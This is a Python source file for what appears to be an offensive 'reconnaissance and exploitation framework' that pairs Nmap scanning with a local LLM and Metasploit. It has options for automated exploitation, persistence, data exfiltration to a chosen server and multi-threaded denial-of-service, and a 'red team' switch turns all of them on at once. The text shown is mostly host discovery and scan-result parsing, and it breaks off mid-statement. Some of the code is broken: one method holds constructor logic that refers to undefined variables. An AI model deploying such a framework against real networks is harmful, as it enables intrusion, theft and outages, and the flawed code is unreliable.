#!/usr/bin/env python3
# Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration
# This script combines Nmap scanning with Ollama LLM for adaptive reconnaissance
# and optionally integrates with Metasploit for exploitation

# Standard library imports
import os
import sys
import time
import json
import socket
import random
import logging
import argparse
import ipaddress
import datetime
import subprocess
import threading
import traceback
import re
import signal
import tempfile
import stat
import itertools
from typing import List, Dict, Any, Optional, Tuple
import xml.etree.ElementTree as ET

# Third-party imports
# Note: we're removing the python-nmap dependency and using direct subprocess calls
import requests
import netifaces
import pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient
import smbclient
import paramiko
import wmi

# Optional imports
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# Configure logging
logger = logging.getLogger("adaptive_scanner")
logger.setLevel(logging.INFO)

# Add console handler if not already added
if not logger.handlers:
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

# Set root logger level to INFO to ensure we see all messages
logging.getLogger().setLevel(logging.INFO)

# Animation and display-related classes
class DummyAnimator:
    """Dummy animator for when quiet mode is enabled."""
    def set(self):
        """Dummy method to maintain interface compatibility."""
        pass

class SingleLineAnimation:
    """Animation class that shows a spinner on a single line."""
    def __init__(self, message, interval=0.1):
        """Initialize the animation with the given message and interval.
        
        Args:
            message: The message to display alongside the spinner
            interval: Time in seconds between spinner updates
        """
        self.message = message
        self.interval = interval
        self.stop_event = threading.Event()
        self.thread = threading.Thread(target=self._animate)
        self.thread.daemon = True
        self.thread.start()
    
    def _animate(self):
        """Animation loop that uses a spinner and stays on a single line."""
        spinner = itertools.cycle(['|', '/', '-', '\\'])
        try:
            while not self.stop_event.is_set():
                print(f'\r[{next(spinner)}] {self.message}', end='', flush=True)
                time.sleep(self.interval)
        finally:
            # Print completion message when done
            print(f'\r[✓] {self.message} - Complete', end='', flush=True)
            print()
    
    def set(self):
        """Stop the animation."""
        self.stop_event.set()
        self.thread.join(timeout=1)  # Wait for thread to finish with timeout

class TerminalViewer:
    """Class for displaying information in the terminal."""
    
    def __init__(self, quiet=False):
        """Initialize the terminal viewer.
        
        Args:
            quiet: When True, most output is suppressed
        """
        self.quiet = quiet
        self.width = self._get_terminal_width()
        self.border_char = "="
        self.section_char = "-"
    
    def _get_terminal_width(self):
        """Get the terminal width or default to 80 columns."""
        try:
            import shutil
            columns = shutil.get_terminal_size().columns
            return min(columns, 100)  # Limit to 100 columns max
        except:
            return 80
    
    # Display formatting methods
    def header(self, title, char="="):
        """Display a header with the given title."""
        if self.quiet:
            return
            
        print(f"\n{char * self.width}")
        print(f"{title.center(self.width)}")
        print(f"{char * self.width}")
    
    def section(self, title):
        """Display a section header."""
        if self.quiet:
            return
            
        print(f"\n{self.section_char * self.width}")
        print(f"{title}")
        print(f"{self.section_char * self.width}")
    
    def result_box(self, title, content):
        """Display content in a formatted box with title."""
        if self.quiet:
            return
            
        print(f"\n{self.section_char * self.width}")
        print(f"| {title}")
        print(f"{self.section_char * self.width}")
        print(content)
        print(f"{self.section_char * self.width}")
    
    # Status message methods
    def status(self, message):
        """Display a status message."""
        if self.quiet:
            return
            
        print(f"[*] {message}")
    
    def success(self, message):
        """Display a success message."""
        if self.quiet:
            return
            
        print(f"\n[+] {message}")
    
    def warning(self, message):
        """Display a warning message."""
        if self.quiet:
            return
            
        print(f"\n[!] {message}")
    
    def error(self, message):
        """Display an error message."""
        # Always show errors, even in quiet mode
        print(f"\n[-] ERROR: {message}")
    
    # Result summary methods
    def scan_summary(self, target, results):
        """Display a summary of scan results."""
        if self.quiet:
            return
            
        if not results:
            self.warning(f"No scan results for {target}")
            return
            
        open_ports = []
        os_info = "Unknown"
        host_info = "Unknown"
        
        # Extract information from results
        if 'scan' in results and target in results['scan']:
            target_info = results['scan'][target]
            
            # Get hostname
            if 'hostnames' in target_info and target_info['hostnames']:
                host_info = target_info['hostnames'][0].get('name', 'Unknown')
                
            # Get OS info if available
            if 'osmatch' in target_info and target_info['osmatch']:
                os_info = target_info['osmatch'][0].get('name', 'Unknown')
                
            # Get open ports
            for proto in ['tcp', 'udp']:
                if proto in target_info:
                    for port, port_data in target_info[proto].items():
                        if port_data['state'] == 'open':
                            service = port_data.get('name', 'unknown')
                            product = port_data.get('product', '')
                            version = port_data.get('version', '')
                            
                            service_str = f"{service}"
                            if product:
                                service_str += f" ({product}"
                                if version:
                                    service_str += f" {version}"
                                service_str += ")"
                                
                            open_ports.append(f"{port}/{proto}: {service_str}")
        
        # Format the summary
        summary = []
        summary.append(f"Target: {target} ({host_info})")
        summary.append(f"OS: {os_info}")
        summary.append(f"Open Ports: {len(open_ports)}")
        
        for port in open_ports:
            summary.append(f"  - {port}")
            
        self.result_box(f"SCAN SUMMARY FOR {target}", "\n".join(summary))
    
    def exploit_summary(self, target, exploit_results):
        """Display a summary of exploitation attempts."""
        if self.quiet:
            return
            
        if not exploit_results:
            self.warning(f"No exploitation results for {target}")
            return
            
        summary = []
        summary.append(f"Target: {target}")
        summary.append(f"Total Exploits Attempted: {exploit_results.get('total_attempts', 0)}")
        summary.append(f"Successful Exploits: {exploit_results.get('successful', 0)}")
        
        # List successful exploits
        if 'details' in exploit_results:
            for port, exploits in exploit_results['details'].items():
                for exploit in exploits:
                    status = "✓" if exploit.get('success', False) else "✗"
                    summary.append(f"  {status} {port}: {exploit.get('name', 'Unknown')}")
        
        self.result_box(f"EXPLOITATION SUMMARY FOR {target}", "\n".join(summary))
    
    def script_generation_summary(self, script_path, script_type, summary):
        """Display a summary of generated script."""
        if self.quiet:
            return
            
        if not script_path:
            self.warning("Script generation failed")
            return
            
        info = []
        info.append(f"Script Type: {script_type}")
        info.append(f"Location: {os.path.abspath(script_path)}")
        info.append(f"Summary: {summary}")
        
        self.result_box(f"GENERATED SCRIPT: {os.path.basename(script_path)}", "\n".join(info))
    
    def script_execution_summary(self, script_path, return_code, output):
        """Display a summary of script execution."""
        if self.quiet:
            return
        
        if not script_path:
            self.warning("Script execution details not available")
            return
            
        summary = []
        summary.append(f"Script: {os.path.basename(script_path)}")
        summary.append(f"Return Code: {return_code}")
        
        # Truncate output if it's too long
        max_output_lines = 20
        output_lines = output.split('\n')
        if len(output_lines) > max_output_lines:
            displayed_output = '\n'.join(output_lines[:max_output_lines])
            displayed_output += f"\n... (truncated, {len(output_lines) - max_output_lines} more lines)"
        else:
            displayed_output = output
            
        summary.append(f"Output:\n{displayed_output}")
        
        self.result_box(f"SCRIPT EXECUTION RESULT", "\n".join(summary))
    
    def dos_attack_summary(self, target, successful, method=None):
        """Display a summary of DoS attack attempt."""
        if self.quiet:
            return
            
        summary = []
        summary.append(f"Target: {target}")
        summary.append(f"Method: {method if method else 'Multiple methods'}")
        summary.append(f"Result: {'Successful' if successful else 'Failed'}")
        
        self.result_box(f"DOS ATTACK SUMMARY", "\n".join(summary))
    
    # Progress display methods
    def progress_bar(self, current, total, prefix='Progress:', suffix='Complete', length=50, fill='█'):
        """Display a progress bar in the terminal."""
        if self.quiet:
            return
            
        percent = ("{0:.1f}").format(100 * (current / float(total)))
        filled_length = int(length * current // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        
        # Use carriage return to rewrite the line each time
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='', flush=True)
        
        # Only print newline when complete
        if current >= total:
            print()
    
    def display_start_banner(self, target, scan_type, model):
        """Display a banner at the start of the scan."""
        if self.quiet:
            return
        
        banner = [
            "┌───────────────────────────────────────────────────┐",
            "│ ADAPTIVE RECONNAISSANCE AND EXPLOITATION FRAMEWORK │",
            "├───────────────────────────────────────────────────┤",
            f"│ Target: {target.ljust(45)} │",
            f"│ Scan Type: {scan_type.ljust(41)} │",
            f"│ Model: {model.ljust(45)} │",
            f"│ Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S').ljust(43)} │",
            "└───────────────────────────────────────────────────┘"
        ]
        
        print("\n".join(banner))
    
    def scanning_animation(self, message, duration=0):
        """Create a scanning animation."""
        if self.quiet:
            return DummyAnimator()
            
        # Return a simple thread-based animation that uses a single line
        return SingleLineAnimation(message)

class NetworkDiscovery:
    """Class to handle network discovery and host detection."""
    
    def __init__(self, interface=None, network=None, timeout=1):
        """Initialize the network discovery with optional interface or network."""
        self.interface = interface
        self.network = network
        self.timeout = timeout
    
    # Interface and network detection methods
    def get_interface_info(self):
        """Get information about available network interfaces."""
        interfaces = []
        
        # Get all network interfaces
        try:
            for iface in netifaces.interfaces():
                iface_info = {
                    'name': iface,
                    'addresses': [],
                    'netmask': None,
                    'cidr': None
                }
                
                # Skip loopback interfaces
                if iface.startswith('lo') or iface == 'lo':
                    continue
                
                # Get addresses for interface
                addresses = netifaces.ifaddresses(iface)
                
                # Get IPv4 addresses
                if netifaces.AF_INET in addresses:
                    for addr in addresses[netifaces.AF_INET]:
                        ip = addr.get('addr')
                        netmask = addr.get('netmask')
                        
                        if ip and ip != '127.0.0.1' and netmask:
                            # Calculate CIDR notation
                            try:
                                cidr = self._netmask_to_cidr(netmask)
                                net = ipaddress.IPv4Network(f"{ip}/{cidr}", strict=False)
                                
                                iface_info['addresses'].append(ip)
                                iface_info['netmask'] = netmask
                                iface_info['cidr'] = str(net)
                            except Exception as e:
                                logger.debug(f"Error calculating CIDR for {iface} ({ip}/{netmask}): {e}")
                
                # Skip interfaces with no usable IPv4 addresses
                if not iface_info['addresses']:
                    continue
                    
                # Check if interface is up (if psutil is available)
                if HAS_PSUTIL:
                    try:
                        io_counters = psutil.net_io_counters(pernic=True)
                        if iface in io_counters:
                            # Interface has traffic stats, likely up
                            iface_info['status'] = 'up'
                        else:
                            iface_info['status'] = 'unknown'
                    except Exception as e:
                        logger.debug(f"Error checking interface status for {iface}: {e}")
                        iface_info['status'] = 'unknown'
                else:
                    iface_info['status'] = 'unknown'
                
                # Add interface to list
                interfaces.append(iface_info)
                
        except Exception as e:
            logger.error(f"Error getting interface information: {e}")
            
        return interfaces
    
    def get_network_cidr(self):
        """Determine the network CIDR to scan."""
        # If network was explicitly provided, use it
        if self.network:
            try:
                # Validate the provided network
                net = ipaddress.IPv4Network(self.network, strict=False)
                logger.info(f"Using provided network: {net}")
                return str(net)
            except Exception as e:
                logger.error(f"Invalid network specification '{self.network}': {e}")
                # Fall through to auto-detection
        
        # If interface was specified, get its network
        if self.interface:
            try:
                interfaces = self.get_interface_info()
                for iface in interfaces:
                    if iface['name'] == self.interface and iface['cidr']:
                        logger.info(f"Using network from interface {self.interface}: {iface['cidr']}")
                        return iface['cidr']
                logger.warning(f"Interface {self.interface} not found or has no usable IP address")
                # Fall through to default interface
            except Exception as e:
                logger.error(f"Error getting network from interface {self.interface}: {e}")
                # Fall through to default interface
        
        # Get the network of the default interface
        try:
            interfaces = self.get_interface_info()
            if interfaces:
                # Try to find a non-virtual interface first
                for iface in interfaces:
                    name = iface['name'].lower()
                    # Skip virtual interfaces
                    if 'veth' in name or 'docker' in name or 'vmnet' in name or 'vbox' in name:
                        continue
                    if iface['cidr']:
                        logger.info(f"Using network from interface {iface['name']}: {iface['cidr']}")
                        return iface['cidr']
                
                # If no suitable interface found, use the first available
                if interfaces[0]['cidr']:
                    logger.info(f"Using network from interface {interfaces[0]['name']}: {interfaces[0]['cidr']}")
                    return interfaces[0]['cidr']
        except Exception as e:
            logger.error(f"Error auto-detecting network: {e}")
        
        # Default to a common private network as last resort
        logger.warning("Could not determine network, using default 192.168.1.0/24")
        return "192.168.1.0/24"
    
    # Host discovery methods
    def ping_host(self, host):
        """Check if a host is alive using ICMP ping."""
        try:
            # Use ping command with timeout
            cmd = ["ping", "-c", "1", "-W", str(self.timeout), str(host)]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            proc.communicate()
            
            # Return True if ping succeeded
            return proc.returncode == 0
        except Exception as e:
            logger.debug(f"Error pinging host {host}: {e}")
            return False
    
    def get_all_hosts(self):
        """Get a list of all hosts in the network."""
        try:
            network = self.get_network_cidr()
            net = ipaddress.IPv4Network(network, strict=False)
            
            # Return all hosts in the network except network and broadcast addresses
            return [str(ip) for ip in net.hosts()]
        except Exception as e:
            logger.error(f"Error getting hosts in network {network}: {e}")
            return []
    
    def discover_hosts(self):
        """Discover live hosts in the network."""
        discovered_hosts = []
        
        try:
            # Get all hosts in the network
            hosts = self.get_all_hosts()
            
            if not hosts:
                logger.warning("No hosts found in network")
                return []
            
            logger.info(f"Scanning {len(hosts)} hosts in network {self.get_network_cidr()}")
            
            # First try ARP scan which is faster and more reliable
            logger.info("Attempting ARP scan first...")
            try:
                nm = nmap.PortScanner()
                arp_result = nm.scan(hosts=' '.join(hosts), arguments="-sn -PR")
                
                if 'scan' in arp_result:
                    for host in arp_result['scan']:
                        if arp_result['scan'][host]['status']['state'] == 'up':
                            discovered_hosts.append(host)
                            logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with ARP scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"ARP scan failed: {e}")
            
            # If ARP scan didn't find hosts, try ping scan
            logger.info("Attempting ping scan...")
            try:
                ping_result = nm.scan(hosts=' '.join(hosts), arguments="-sn -PE")
                
                if 'scan' in ping_result:
                    for host in ping_result['scan']:
                        if ping_result['scan'][host]['status']['state'] == 'up':
                            if host not in discovered_hosts:
                                discovered_hosts.append(host)
                                logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with ping scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"Ping scan failed: {e}")
            
            # If still no hosts found, try TCP SYN scan on common ports
            logger.info("Attempting TCP SYN scan on common ports...")
            try:
                syn_result = nm.scan(hosts=' '.join(hosts), arguments="-sS -T4 -F")
                
                if 'scan' in syn_result:
                    for host in syn_result['scan']:
                        if host not in discovered_hosts:
                            discovered_hosts.append(host)
                            logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with SYN scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"SYN scan failed: {e}")
            
            # If still no hosts found, try UDP scan
            logger.info("Attempting UDP scan...")
            try:
                udp_result = nm.scan(hosts=' '.join(hosts), arguments="-sU -T4 -F")
                
                if 'scan' in udp_result:
                    for host in udp_result['scan']:
                        if host not in discovered_hosts:
                            discovered_hosts.append(host)
                            logger.info(f"Found host: {host}")
                
                if discovered_hosts:
                    logger.info(f"Found {len(discovered_hosts)} hosts with UDP scan")
                    return discovered_hosts
                    
            except Exception as e:
                logger.error(f"UDP scan failed: {e}")
            
            # If we still haven't found any hosts, try a more aggressive approach
            if not discovered_hosts:
                logger.info("No hosts found with standard methods, trying aggressive scan...")
                try:
                    aggressive_result = nm.scan(
                        hosts=' '.join(hosts),
                        arguments="-sS -sU -T4 -p- --max-retries 2 --max-scan-delay 20s"
                    )
                    
                    if 'scan' in aggressive_result:
                        for host in aggressive_result['scan']:
                            if host not in discovered_hosts:
                                discovered_hosts.append(host)
                                logger.info(f"Found host: {host}")
                                
                except Exception as e:
                    logger.error(f"Aggressive scan failed: {e}")
            
            logger.info(f"Total hosts discovered: {len(discovered_hosts)}")
            return discovered_hosts
            
        except Exception as e:
            logger.error(f"Error in host discovery: {e}")
            return []
    
    def discover_networks(self):
        """Discover additional networks connected to the host."""
        networks = []
        
        try:
            # Get information about all interfaces
            interfaces = self.get_interface_info()
            
            for iface in interfaces:
                if iface['cidr']:
                    # Add network to list
                    networks.append({
                        'interface': iface['name'],
                        'network': iface['cidr'],
                        'ip': iface['addresses'][0] if iface['addresses'] else None
                    })
            
            # Try to discover additional networks via routing table
            if HAS_PSUTIL:
                try:
                    for conn in psutil.net_connections(kind='inet'):
                        if conn.laddr and conn.raddr:
                            try:
                                # Check if remote address is not in any discovered network
                                remote_ip = conn.raddr.ip
                                if not any(ipaddress.IPv4Address(remote_ip) in ipaddress.IPv4Network(net['network'], strict=False) for net in networks):
                                    # Add a /24 network based on remote IP
                                    remote_net = ipaddress.IPv4Network(f"{remote_ip}/24", strict=False)
                                    networks.append({
                                        'interface': None,
                                        'network': str(remote_net),
                                        'ip': None
                                    })
                            except Exception as e:
                                logger.debug(f"Error processing connection {conn}: {e}")
                except Exception as e:
                    logger.debug(f"Error discovering networks via connections: {e}")
        except Exception as e:
            logger.error(f"Error discovering networks: {e}")
        
        return networks
    
    def alternative_host_discovery(self):
        """Use alternative methods to discover hosts when ping fails."""
        discovered_hosts = []
        
        try:
            network = self.get_network_cidr()
            
            # Use ARP scan with Nmap
            logger.info("Attempting ARP scan to discover hosts")
            nm = nmap.PortScanner()
            result = nm.scan(hosts=network, arguments="-sn -PR")
            
            if 'scan' in result:
                for host in result['scan']:
                    discovered_hosts.append(host)
            
            # If still no hosts found, try UDP discovery
            if not discovered_hosts:
                logger.info("Attempting UDP discovery scan")
                result = nm.scan(hosts=network, arguments="-sn -PU")
                
                if 'scan' in result:
                    for host in result['scan']:
                        discovered_hosts.append(host)
        except Exception as e:
            logger.error(f"Error in alternative host discovery: {e}")
        
        return discovered_hosts
    
    # Helper methods
    def _netmask_to_cidr(self, netmask):
        """Convert a netmask to CIDR notation."""
        return sum(bin(int(x)).count('1') for x in netmask.split('.'))

# Custom Nmap scanner implementation using subprocess
class DirectNmapScanner:
    """Direct implementation of nmap scanning using subprocess instead of python-nmap."""
    
    @staticmethod
    def check_nmap_installed():
        """Check if nmap is installed and available on the system."""
        try:
            result = subprocess.run(['nmap', '--version'], 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                universal_newlines=True,
                check=False)
            if result.returncode == 0:
                logger.debug(f"Nmap found: {result.stdout.strip()}")
                return True
            else:
                logger.error(f"Nmap check failed: {result.stderr}")
                return False
        except (subprocess.SubprocessError, FileNotFoundError) as e:
            logger.error(f"Nmap not found or not executable: {e}")
            return False

    @staticmethod
    def scan(hosts, arguments):
        """Run an nmap scan using subprocess and return results in a dictionary format.
        
        Args:
            hosts: Target IP address or hostname
            arguments: Nmap command line arguments as a string
            
        Returns:
            Dictionary with scan results in a format similar to python-nmap
        """
        # Verify nmap is installed
        if not DirectNmapScanner.check_nmap_installed():
            logger.error("Nmap is not installed on this system")
            return None
            
        # Create temporary file for XML output
        fd, xml_output = tempfile.mkstemp(suffix='.xml', prefix='nmap_')
        os.close(fd)
        
        try:
            # Build command
            cmd = ['nmap']
            
            # Add XML output first
            cmd.extend(['-oX', xml_output])
            
            # Add all arguments except target
            if arguments:
                args_list = arguments.split()
                for arg in args_list:
                    if arg != hosts:  # Avoid adding target twice
                        cmd.append(arg)
            
            # Add target last
            cmd.append(hosts)
            
            # Log the command
            logger.debug(f"Running nmap command: {' '.join(cmd)}")
            
            # Run scan with timeout
            start_time = time.time()
            timeout = 300  # 5 minutes timeout
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            # Wait for process with timeout
            while True:
                if time.time() - start_time > timeout:
                    process.terminate()
                    logger.error("Nmap scan timed out after 5 minutes")
                    return None
                    
                if process.poll() is not None:
                    break
                    
                time.sleep(0.1)
            
            # Get output
            stdout, stderr = process.communicate()
            elapsed = time.time() - start_time
            
            # Check for errors
            if process.returncode != 0:
                logger.error(f"Nmap scan failed with return code {process.returncode}")
                logger.error(f"Error: {stderr}")
                return None
                
            # Parse XML output into nmap-like dictionary
            return DirectNmapScanner.parse_xml(xml_output, cmd, elapsed, stdout, stderr)
            
        except Exception as e:
            logger.error(f"Error running nmap scan: {e}")
            return None
        finally:
            # Clean up temporary file
            try:
                os.unlink(xml_output)
            except:
                pass
                
    @staticmethod
    def parse_xml(xml_file, cmd, elapsed, stdout, stderr):
        """Parse nmap XML output into a dictionary.
        
        Args:
            xml_file: Path to XML file to parse
            cmd: Original command that was run
            elapsed: Time elapsed during scan
            stdout: Standard output from nmap
            stderr: Standard error from nmap
            
        Returns:
            Dictionary with scan results
        """
        try:
            # Parse XML
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            # Create result dictionary in python-nmap compatible format
            result = {
                'nmap': {
                    'command_line': ' '.join(cmd),
                    'scaninfo': {},
                    'scanstats': {
                        'timestr': root.find('runstats/finished').get('timestr', '') if root.find('runstats/finished') is not None else '',
                        'elapsed': root.find('runstats/finished').get('elapsed', str(elapsed)) if root.find('runstats/finished') is not None else str(elapsed),
                        'uphosts': root.find('runstats/hosts').get('up', '0') if root.find('runstats/hosts') is not None else '0',
                        'downhosts': root.find('runstats/hosts').get('down', '0') if root.find('runstats/hosts') is not None else '0',
                        'totalhosts': root.find('runstats/hosts').get('total', '0') if root.find('runstats/hosts') is not None else '0',
                    }
                },
                'scan': {}
            }
            
            # Extract scan info
            for scaninfo in root.findall('scaninfo'):
                result['nmap']['scaninfo'][scaninfo.get('protocol', '')] = {
                    'method': scaninfo.get('type', ''),
                    'services': scaninfo.get('services', '')
                }
            
            # Process each host
            for host in root.findall('host'):
                # Get host address (prefer IPv4)
                addr = None
                for address in host.findall('address'):
                    if address.get('addrtype') == 'ipv4':
                        addr = address.get('addr')
                        break
                if not addr and host.find('address') is not None:
                    addr = host.find('address').get('addr', '')
                if not addr:
                    # Skip hosts without an address
                    continue
                    
                # Initialize host data structure
                result['scan'][addr] = {
                    'hostnames': [],
                    'addresses': {},
                    'vendor': {},
                    'status': {},
                    'tcp': {},
                    'udp': {}
                }
                
                # Get all addresses
                for address in host.findall('address'):
                    addr_type = address.get('addrtype', '')
                    result['scan'][addr]['addresses'][addr_type] = address.get('addr', '')
                    if address.get('vendor') and address.get('addr'):
                        result['scan'][addr]['vendor'][address.get('addr')] = address.get('vendor', '')
                
                # Get status
                status = host.find('status')
                if status is not None:
                    result['scan'][addr]['status'] = {
                        'state': status.get('state', ''),
                        'reason': status.get('reason', '')
                    }
                
                # Get hostnames
                hostnames = host.find('hostnames')
                if hostnames is not None:
                    for hostname in hostnames.findall('hostname'):
                        result['scan'][addr]['hostnames'].append({
                            'name': hostname.get('name', ''),
                            'type': hostname.get('type', '')
                        })
                
                # Get ports
                ports = host.find('ports')
                if ports is not None:
                    for port in ports.findall('port'):
                        protocol = port.get('protocol', '')
                        port_id = port.get('portid', '')
                        
                        if not protocol or not port_id:
                            continue
                        
                        # Create port data
                        port_data = {
                            'state': '',
                            'reason': '',
                            'name': '',
                            'product': '',
                            'version': '',
                            'extrainfo': '',
                            'conf': '',
                            'cpe': ''
                        }
                        
                        # Get state
                        state = port.find('state')
                        if state is not None:
                            port_data['state'] = state.get('state', '')
                            port_data['reason'] = state.get('reason', '')
                        
                        # Get service info
                        service = port.find('service')
                        if service is not None:
                            port_data['name'] = service.get('name', '')
                            port_data['product'] = service.get('product', '')
                            port_data['version'] = service.get('version', '')
                            port_data['extrainfo'] = service.get('extrainfo', '')
                            port_data['conf'] = service.get('conf', '')
                            
                            # Get CPE
                            cpe = service.find('cpe')
                            if cpe is not None and cpe.text:
                                port_data['cpe'] = cpe.text
                        
                        # Add port to result
                        result['scan'][addr][protocol][port_id] = port_data
                
                # Get OS detection
                os_matches = host.find('os')
                if os_matches is not None:
                    result['scan'][addr]['osmatch'] = []
                    for osmatch in os_matches.findall('osmatch'):
                        os_data = {
                            'name': osmatch.get('name', ''),
                            'accuracy': osmatch.get('accuracy', ''),
                            'osclass': []
                        }
                        
                        for osclass in osmatch.findall('osclass'):
                            class_data = {
                                'type': osclass.get('type', ''),
                                'vendor': osclass.get('vendor', ''),
                                'osfamily': osclass.get('osfamily', ''),
                                'osgen': osclass.get('osgen', ''),
                                'accuracy': osclass.get('accuracy', '')
                            }
                            os_data['osclass'].append(class_data)
                        
                        result['scan'][addr]['osmatch'].append(os_data)
            
            # All done
            return result
            
        except Exception as e:
            logger.error(f"Error parsing nmap XML output: {e}")
            logger.debug(traceback.format_exc())
            return None

# Make DirectNmapScanner available as a PortScanner
class PortScanner:
    """PortScanner class to mimic python-nmap interface."""
    
    def __init__(self):
        """Initialize the port scanner."""
        # Nothing to initialize
        pass
        
    def scan(self, hosts, arguments):
        """Run nmap scan and return results."""
        return DirectNmapScanner.scan(hosts, arguments)

# Replace nmap with our custom scanner
nmap = type('nmap', (), {'PortScanner': PortScanner})

class AdaptiveNmapScanner:
    """Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration."""

    def __init__(
        self,
        target=None,
        ollama_model="qwen2.5-coder:7b",
        max_iterations=3,
        continuous=False,
        delay=2,
        msf_integration=False,
        exploit=False,
        msf_workspace="adaptive_scan",
        stealth=False,
        auto_script=False,
        quiet=False,
        debug=False,
        auto_discover=False,
        interface=None,
        scan_all=False,
        network=None,
        host_timeout=1,
        custom_scripts=False,
        script_type="bash",
        execute_scripts=False,
        dos_attack=False,
        show_live_ai=False,
        red_team=False,
        persistence=False,
        exfil=False,
        exfil_method=None,
        exfil_data=None,
        exfil_server=None,
        dos_method=None,
        dos_threads=10,
        dos_duration=60,
        dos_payload=None
    ):
        """Initialize the scanner with the given parameters."""
        self.target = target
        self.ollama_model = ollama_model
        self.max_iterations = max_iterations
        self.continuous = continuous
        self.delay = delay
        self.msf_integration = msf_integration
        self.exploit = exploit
        self.msf_workspace = msf_workspace
        self.stealth = stealth
        self.auto_script = auto_script
        self.quiet = quiet
        self.debug = debug
        self.auto_discover = auto_discover
        self.interface = interface
        self.scan_all = scan_all
        self.network = network
        self.host_timeout = host_timeout
        self.custom_scripts = custom_scripts
        self.script_type = script_type
        self.execute_scripts = execute_scripts
        self.dos_attack = dos_attack
        self.show_live_ai = show_live_ai
        
        # New red team parameters
        self.red_team = red_team
        self.persistence = persistence
        self.exfil = exfil
        self.exfil_method = exfil_method
        self.exfil_data = exfil_data
        self.exfil_server = exfil_server
        
        # Enhanced DoS parameters
        self.dos_method = dos_method
        self.dos_threads = dos_threads
        self.dos_duration = dos_duration
        self.dos_payload = dos_payload
        
        # If red team mode is enabled, enable all related features
        if self.red_team:
            self.msf_integration = True
            self.exploit = True
            self.persistence = True
            self.exfil = True
            self.custom_scripts = True
            self.auto_script = True
            self.stealth = True
        
        # Add logger to the class instance
        self.logger = logger
        
        # Set up remaining components
        self.ollama_url = "http://localhost:11434/api/generate"
        self.running = True
        self.scan_history = []
        self.viewer = TerminalViewer(quiet=quiet)
        self.msf_client = None
        self.discovered_hosts = []
        self.current_target_index = 0
        
        # Network discovery setup
        self.network_discovery = None
        if self.auto_discover:
            self.network_discovery = NetworkDiscovery(
                interface=self.interface,
                network=self.network,
                timeout=self.host_timeout
            )
        
        # If model isn't one of our default models, check if it exists and download if needed
        self._ensure_model_available()
        
    def _ensure_model_available(self):
        """Ensure the specified Ollama model is available, downloading it if needed."""
        try:
            # Try to check if model is available using Ollama's list API
            response = requests.get("http://localhost:11434/api/tags")
            if response.status_code == 200:
                available_models = [model['name'] for model in response.json().get('models', [])]
                
                # If model is available, just use it
                if self.ollama_model in available_models:
                    logger.info(f"Using existing model: {self.ollama_model}")
                    return
                
                # If model isn't available, try to download it
                logger.warning(f"Model {self.ollama_model} not found. Attempting to download...")
                self.viewer.status(f"Model {self.ollama_model} not found. Attempting to download...")
                
                try:
                    download_process = subprocess.Popen(
                        ["ollama", "pull", self.ollama_model],
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE
                    )
                    
                    # Wait for download to complete
                    stdout, stderr = download_process.communicate()
                    
                    if download_process.returncode == 0:
                        logger.info(f"Successfully downloaded model: {self.ollama_model}")
                        self.viewer.success(f"Successfully downloaded model: {self.ollama_model}")
                        return
                    else:
                        logger.error(f"Failed to download model: {self.ollama_model}. Error: {stderr.decode()}")
                        self.viewer.error(f"Failed to download model: {self.ollama_model}")
                        
                except Exception as e:
                    logger.error(f"Error downloading model: {e}")
                    self.viewer.error(f"Error downloading model: {str(e)}")
            
            # If we reach here, either checking or downloading failed
            # Fall back to default model
            if self.ollama_model != "qwen2.5-coder:7b" and self.ollama_model != "gemma3:1b":
                logger.warning(f"Falling back to default model: qwen2.5-coder:7b")
                self.viewer.warning(f"Falling back to default model: qwen2.5-coder:7b")
                self.ollama_model = "qwen2.5-coder:7b"
                
                # Recursively check if default model is available
                self._ensure_model_available()
        
        except Exception as e:
            logger.error(f"Error checking model availability: {e}")
            self.viewer.error(f"Error checking model availability: {str(e)}")
            
            # Fall back to default model in case of any error
            if self.ollama_model != "qwen2.5-coder:7b":
                logger.warning(f"Falling back to default model: qwen2.5-coder:7b")
                self.ollama_model = "qwen2.5-coder:7b"
        
        # Metasploit settings
        self.msf_integration = msf_integration
        self.exploit = exploit
        self.msf_workspace = msf_workspace
        self.msf_client = None
        self.msf_connected = False
        
        # Script settings
        self.auto_script = auto_script
        self.custom_scripts = custom_scripts
        self.script_type = script_type
        self.execute_scripts = execute_scripts
        
        # DoS attack settings
        self.dos_attack = dos_attack
        
        # Output settings
        self.quiet = quiet
        self.debug = debug
        
        # Set up logging level based on debug flag
        if debug:
            logger.setLevel(logging.DEBUG)
        else:
            logger.setLevel(logging.INFO)
        
        # Create a logger specific to this instance
        self.logger = logging.getLogger(f"adaptive_scanner.{id(self)}")
        self.logger.setLevel(logging.DEBUG if debug else logging.INFO)
        
        # Add console handler if not already added
        if not self.logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(console_handler)
        
        # Initialize the terminal viewer for output
        self.viewer = TerminalViewer(quiet=quiet)
        
        # Scan results history
        self.scan_history = []
        
        # Flag to control graceful termination
        self.running = True
        
        # Register signal handler for graceful termination
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # Handle auto-discovery if needed
        if self.auto_discover or not self.target:
